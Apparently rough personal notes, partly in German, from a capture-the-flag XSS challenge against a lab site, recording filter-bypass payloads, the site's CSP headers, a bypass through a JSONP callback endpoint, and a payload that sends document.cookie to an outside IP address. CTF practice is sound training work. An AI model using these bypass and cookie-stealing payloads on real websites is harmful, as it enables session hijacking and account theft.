
# Framework 
php

5e6cec813f3a3

about.php 
items.php => items.php?cb=parseItems
?search=<<i>>TEST<<%2Fi>> => "<>TEST<>" 

<input name="link" type="text" size="100" placeholder="URL" required pattern="^http://xss\.allesctf\.net/.*$"/>
</div>

server geht nur über allectf.net

# Struktur

http://xss.allesctf.net/?search=

http://stage2.xss.allesctf.net/?token= => Hintergrund ändern stage 2 XSS ?


# php session id

striesf33fst5o1hguu3gnk5k4
7k5ri26f3ici7tpste25r31dg2c

<sc<script>ript>alert(1)</script>
ript>alert(1)

<<s<c<script>script>alert(1)</script>
<script>alert(1)

<<s<c<script>script>alert(1)<<sc</script>/script>



http://xss.allesctf.net/?search=%3Cscript+%3Ealert%281%29%3B%3C+%2F+script%3E


http://xss.allesctf.net/items.php?cb=PAPA
http://xss.allesctf.net/items.php?cb=%3Chtml%3E%3C/html%3E
FORBIDDEN_CHARFORBIDDEN_CHARhtmlFORBIDDEN_CHARFORBIDDEN_CHARFORBIDDEN_CHARFORBIDDEN_CHAR/htmlFORBIDDEN_CHARFORBIDDEN_CHAR


<img src onerror="javascript::alert(1);"/>

<img src onerror="javascript::alert(1);"/>

"aa</b><<s<c<script>script>alert("1");<<sc</script>/script><b>aa"


</b><script>alert(1)</script><b>


Content-Security-Policy: default-src 'self' http://*.xss.allesctf.net; object-src 'none'; base-uri 'none';
Content Security Policy: The page’s settings blocked the loading of a resource at inline (“default-src”).

XSS
</b><script src="/items.php?cb=var m = new Image(0, 0);m.src = 'http://131.234.217.81:8000/test.png?g=' + document.cookie;document.body.appendChild(m);//"></script><b>,

var m = new Image(0, 0);m.src = 'http://131.234.217.81:8000/test.png?g=' + document.cookie;document.body.appendChild(m);//

window.location = "http://stage2.xss.allesctf.net/";

fetch("http://131.234.217.81/test.json")


HTTP/1.1 200 OK
Server: nginx/1.14.1
Date: Sat, 14 Mar 2020 17:46:45 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 3080
Connection: close
X-XSS-Protection: secure!
X-Frame-Options: deny
X-Content-Type-Options: nosniff
Content-Security-Policy: script-src 'nonce-moicNxQo5oosc6uboIPG5zGv6pI=' 'unsafe-inline' 'strict-dynamic'; base-uri 'none'; object-src 'none';
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: PHPSESSID=as8rqnhhuoah0p7qka6igocil2; path=/; SameSite=Lax;; domain=xxs.allesctf.net; HttpOnly
Vary: Accept-Encoding


fetch mit php sess id ?


http://xss.allesctf.net/?search=</b><script src="/items.php?cb=window.location='http://stage2.xss.allesctf.net/?token=5e6d1d66ebf78';//"></script><b>

http://xss.allesctf.net/?search=%3C%2Fb%3E%3Cscript%20src%3D%22%2Fitems.php%3Fcb%3Dwindow.location%3D%27http%3A%2F%2Fstage2.xss.allesctf.net%2F%3Ftoken%3D5e6d1d66ebf78%27%3B%2F%2F%22%3E%3C%2Fscript%3E%3Cb%3E

http://xss.allesctf.net/?search=%3C%2Fb%3E%3Cscript%20src%3D%22%2Fitems.php%3Fcb%3Dwindow.location%3D%27http%3A%2F%2Fstage2.xss.allesctf.net%2F%3Ftoken%3D5e6d1a55bb4f5%27%3B%2F%2F%22%3E%3C%2Fscript%3E%3Cb%3E

5e6d1a55bb4f5


5e6d17fc7162e


http%3A%2F%2Fxss.allesctf.net%2F%3Fsearch%3D%3C%2Fb%3E%3Cscript%20src%3D%22%2Fitems.php%3Fcb%3Dwindow.location%3D%27http%3A%2F%2Fstage2.xss.allesctf.net%2F%3Ftoken%3D5e6d1a55bb4f5%27%3B%2F%2F%22%3E%3C%2Fscript%3E%3Cb%3E


</b><script src="/items.php?cb=eval('');alert(1);//"></script><b>